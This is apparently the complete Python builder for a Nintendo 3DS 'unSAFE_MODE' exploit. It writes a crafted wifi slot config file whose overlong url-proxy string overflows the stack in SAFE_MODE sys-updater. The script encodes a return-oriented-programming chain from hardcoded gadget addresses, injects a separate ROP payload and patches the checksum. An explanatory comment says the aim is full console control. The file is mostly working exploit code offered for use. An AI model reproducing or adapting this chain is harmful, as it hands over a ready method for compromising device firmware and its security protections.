import os,sys,struct

STACK_PIVOT=0x001000C0 #add sp,sp,r3; pop(pc)
SET_EQ_FLAG=0x00230018 #ands r1, r0, #0x80000000 ; ldrpl r0, [r4, #4] ; add sp, sp, #8 ; pop {r4, pc}   -- todo, find a less space hogging gadget, jeez
MOV_R0R4=0x00150070    #mov r0,r4
POP_R3R7PC=0x0014ffa8  #pop {r3, r4, r5, r6, r7, pc}
ADD_SPSP_CONSTANT=0xffffff80 #(r3) by adding this constant to the stack, we subtract 0x80 bytes and buy more space to work with
EOREQ_PC=0x00190024    #EOREQ PC r5, r0 lsl #7
POP_R4PC=0x00150074    #pop {r4, pc}
POP_R4R5PC=0x0023006c  #pop {r4, r5, pc}
POP_R4R12PC=0x00150e20 #pop {r4, r5, r6, r7, r8, sb, sl, fp, ip, pc} ; copied from Ropgadget.
STRB_R6R4=0x001a20dc   #strb r6, [r4] ; pop {r4, r5, r6, pc}
PIVOT_JUMP_STORE=0x00500004
LDR_R3R10_BLXR12=0x00213604 # ldr r3, [sl] ; ... ; blx ip ;

ROPADDR=0x600000
POP_R0R2R5PC=0x0010de68+1   # pop {r0, r1, r2, r5, pc} - thumb
GetInfoBlk8=0x1fb184
CRASH=0x98989898
POP_R3PC=0x00110ce0

LANDING_ADDR=0x276000  #where the normal rop chain begins after this scripts chain pivots to it.
SP_ADD=(LANDING_ADDR-0x0fffff48) & 0xffffffff
BYTE0=0x00770000 | (SP_ADD     & 0xff)
BYTE1=0x00770000 | (SP_ADD>>8  & 0xff)
BYTE2=0x00770000 | (SP_ADD>>16 & 0xff)
BYTE3=0x00770000 | (SP_ADD>>24 & 0xff)
print("SP add:%02X%02X%02X%02X" % (BYTE3&0xFF,BYTE2&0xFF,BYTE1&0xFF,BYTE0&0xFF))
ROP=""


def gadget_eoreq(a, slot, r5off, r4off):  # converts a normal address to work with the EOREQ PC r5, r0 lsl #7 gadget in unsafe mode (also handles ascii -> utf-16).
	flag=0                            # this expands from 1/256 of available gadgets to about 1/2
	for i in range(1,256):		  # this gadget requires another gadget to mov r0, r4
		for j in range(1,256):
			r5=i
			r4=j
			flag=0
			if r5 >= 0x80:
				r5=0xFF00 | r5
			if r4 >= 0x80:
				r4=0xFF00 | r4
				flag=1
			final=(r4<<7 | r5) & 0xFFFF
			if (final == a & 0xFFFF):
				if flag:
					r5h=0x80 | ((~(a>>16)) & 0x7F)
				else:
					r5h=0x80 | a>>16
				r5=r5h<<8 | r5&0xFF
				r4=0xFF00 | r4&0xFF
				with open("slot%d.bin" % slot,"rb+") as f:
					f.seek(r5off)
					f.write(struct.pack("<H",r5))
					f.seek(r4off)
					f.write(struct.pack("<H",r4))
				print("address:%08X r5:%04X r4:%04X" % (a,r5,r4))
				return
	print("invalid address - eoreq cannot handle it")
	return

def ffexpand(n):
	if(n>=0x80):
		return 0xFF00 | n
	return n
	
def gadget(a, slot, off): # converts normal address to the unsafe mode "alternating" bytes structure aka ascii -> utf-16  (i.e 0x00120044 becomes 0x1244).
	# not checked: if controlled byte >= 0x80, then next higher byte is 0xff, else next higher byte is 0x00. Example 0xFF81007F or 0x0022FFA4. Bytes [0] and [2] are controlled.
	# it's assumed this is checked manually. Additionally, any controlled byte cannot be zero, else the exploit string is terminated prematurely.
	newaddr=(a & 0xff0000)>>8 | (a & 0xff)
	with open("slot%d.bin" % slot,"rb+") as f:
		f.seek(off)
		f.write(struct.pack("<H",newaddr))
	print("address:%08X" % a)
	
def normal_gadget(n):
	global ROP
	ROP+=struct.pack("<I", n)
	print("normal address:%08X" % n)
	
def inject_chain(slot,off):
	global ROP
	with open("slot%d.bin" % slot,"rb+") as f:
		f.seek(off)
		f.write(ROP)
	
def check(r5,r4,a): #no need to use this anymore, my address convert functions work
	if r5==0:
		print("invalid address - eoreq cannot handle it")
		return
	r5low=ffexpand(r5 & 0xFF)
	r5high=ffexpand(r5>>8)
	
	r4low=ffexpand(r4 & 0xFF)
	r4high=ffexpand(r4>>8)
	
	final=(r5high<<16 | r5low) ^ ((r4high<<16 | r4low)<<7)
	
	if final&0xFFFFFFFF == a:
		print("PASS")
		return
	print("FAIL - %08X" % a)
	
def format_exploit_slot(slotnum):
	pad=b"\x00"
	slot=b"\x01" + pad*3 + b"\x01\x01" + pad*2 + b"Haaaaaaaxxxxxxxxxxxxxxxx" + b"\x19\x07\x99\x38\x33\xD8\xD3\x19\x20" + pad*0x33f + b"\x01\x01\x01\x00" + b"\x44"*0xa5 + pad + b"\x78\x05" + pad*12 + b"HAXX" + pad*0x7dc
	with open("slot%d.bin" % slotnum,"wb+") as f:
		f.write(slot)
		
def inject_codebin(srcpath, slot,off):
	pad=b"\x00"*0x100
	with open(srcpath,"rb") as f:
		buff=f.read()
	with open("slot%d.bin" % slot,"rb+") as f:
		f.seek(off)
		f.write(buff+pad)
		
	
'''
The exploit itself is an unchecked size, null terminated ascii string crashing the stack (after utf-16 conversion) from a wifi slot's url-proxy field when SAFE_MODE sys-updater attempts to display the string. 
Sys-updater does mandate certain offsets in the slot be nulled (about every 0xA4), but the size allowed when the url-proxy string bleeds into the proceeding two fields is too much.

In order to install this exploit to a wifi slot, userland exe with cfg:i/cfg:s is needed, and can be acquired with *hax after a little src modification (bannerbomb3 also works). The installation target is the config savegame, which several apps, including mset and SAFE_MODE sys-updater (essentially mset v1.0 with minor changes), have access to with the cfg service.
While this makes unSAFE_MODE a true secondary sploit, it has the notable advantage of running *under* SAFE_MODE firm, which allows an attacker to launch numerous old k11 and arm9 sploits, and get full 3ds control 
as a result (safehax).

#######

The goal of this rop chain is to pivot as quick as possible in the 0xA4 space we have. Because of ascii->utf-16le conversion when this hits the stack, we only have 1/256 of the # of gadgets normally available.
The key is an EOREQ PC, r0, r4, lsl #7 gadget *luckily available, that allows us to combine two 'gimped' addresses into an almost full one. This allows access to about 1/2 of available gadgets - which is just barely sufficient to pivot away to a normal rop chain that we can actually do something with.
'''

format_exploit_slot(1) #creates a 0xC00 byte wifi slot template file suitable for unSAFE_MODE exploitation.
#sys.exit(0)

#We begin the exploit controlling r4-r10 and PC at string+0x8a. We only have about 0x18 bytes remaining before we hit the end of the string, so we need to pivot backwards quickly for more space.
gadget(SET_EQ_FLAG, 1, 0x3f6) #needed for eoreq to work since it's a conditional instruction.
gadget(MOV_R0R4, 1, 0x3fe)    #another eoreq setup
gadget(POP_R3R7PC, 1, 0x402)  #setup r3 and pc for the upcoming stack pivot, launched by eoreq. this is needed to get more rop space (we'll be down to our last byte!). we still don't have "normal" rop exe yet.
gadget(ADD_SPSP_CONSTANT, 1, 0x404) #0xFFFFFF80 Basically "adding" -0x80
gadget_eoreq(STACK_PIVOT, 1, 0x408, 0x3fc) #sets up args for the next eoreq jump - eoreq pc combines 2 registers for a final pc jump that has much more address coverage than what we currently have
gadget(EOREQ_PC, 1, 0x40e)    #subtract the stack, get +0x80 bytes
gadget(EOREQ_PC, 1, 0x3d0)    #do it again for another 0x80!

#phew, we have room now

gadget(MOV_R0R4, 1, 0x392)    #setup next eoreq
gadget(POP_R4R5PC, 1, 0x396)
gadget_eoreq(POP_R4R12PC, 1, 0x39a, 0x406) #This giant pop contains several args for the rest of this pivot chain: r4,r5 for next eoreq, r6 and r10 for byte copy src and dest, and r12 for the blx jump after LDR_R3R10_BLXR12
gadget(EOREQ_PC, 1, 0x39c)    
gadget(MOV_R0R4, 1, 0x3b0)

gadget_eoreq(STRB_R6R4, 1, 0x3a0, 0x39e)  #move 1st pivot jump byte (BYTE0) to PIVOT_JUMP_STORE. we'll call this 3 more times to make a full SP_ADD to modify r3 on our upcoming final stack pivot...
gadget_eoreq(STRB_R6R4, 1, 0x3b8, 0x39e)  #these extra calls set up the r5 registers since we change args each call (r4 stays the same throughout since it's copied to r0).
gadget_eoreq(STRB_R6R4, 1, 0x3c0, 0x39e)
gadget_eoreq(STRB_R6R4, 1, 0x3c8, 0x39e)
gadget(PIVOT_JUMP_STORE, 1, 0x3b2)
gadget(BYTE0, 1, 0x3a2)
gadget(EOREQ_PC, 1, 0x3b4)

gadget(PIVOT_JUMP_STORE+1, 1, 0x3b6)      #'' 2nd
gadget(BYTE1, 1, 0x3ba)
gadget(EOREQ_PC, 1, 0x3bc)

gadget(PIVOT_JUMP_STORE+2, 1, 0x3be)      #'' 3rd
gadget(BYTE2, 1, 0x3c2)
gadget(EOREQ_PC, 1, 0x3c4)

gadget(PIVOT_JUMP_STORE+3, 1, 0x3c6)      #'' 4th
gadget(BYTE3, 1, 0x3ca)
gadget(POP_R4PC, 1, 0x3cc)
gadget(PIVOT_JUMP_STORE+3, 1, 0x3ce)
#gadget(EOREQ_PC, 1, 0x3d0) #gadget already exists from previous pivot

gadget(PIVOT_JUMP_STORE, 1, 0x3aa)
gadget_eoreq(LDR_R3R10_BLXR12, 1, 0x3d4, 0x3d2)   #load u32 from the PIVOT_JUMP_STORE so STACK_PIVOT can use it
gadget(MOV_R0R4, 1, 0x3d8)
gadget(EOREQ_PC, 1, 0x3dc)

gadget(POP_R4R5PC, 1, 0x3ae)
gadget(MOV_R0R4, 1, 0x3e2)
gadget_eoreq(STACK_PIVOT, 1, 0x3e0, 0x3de)
gadget(EOREQ_PC, 1, 0x3e6)                        #jump to freedom! (an actual normal rop chain). finally out of this mess - now off to let out some frustration on SAFE_MODE firm :p


# Called by stage1
print("injecting ropbin...")
inject_codebin("rop_payload.bin", 1,0x140)

# Fix CRC16
STANDARD=0x0000
MODBUS=0xFFFF
def fix_crc16(path, offset, size, crc_offset, type):
	'''
	CRC-16-Modbus Algorithm
	'''
	with open(path,"rb+") as f:
		f.seek(offset)
		data=f.read(size)
		
		poly=0xA001
		crc = type
		for b in data:
			if sys.version_info[0] >= 3:
				cur_byte = 0xFF & int(b)
			else:
				cur_byte = 0xFF & ord(b)
				
			for _ in range(0, 8):
				if (crc & 0x0001) ^ (cur_byte & 0x0001):
					crc = (crc >> 1) ^ poly
				else:
					crc >>= 1
				cur_byte >>= 1

		crc16=crc & 0xFFFF

		print("Patching offset %08X..." % crc_offset)
		f.seek(crc_offset)
		f.write(struct.pack("<H",crc16))

fix_crc16("slot1.bin", 0x4, 0x410, 0x2, STANDARD)

print("done")

#  *this gadget was actually intended as an address in the code, not an instruction.
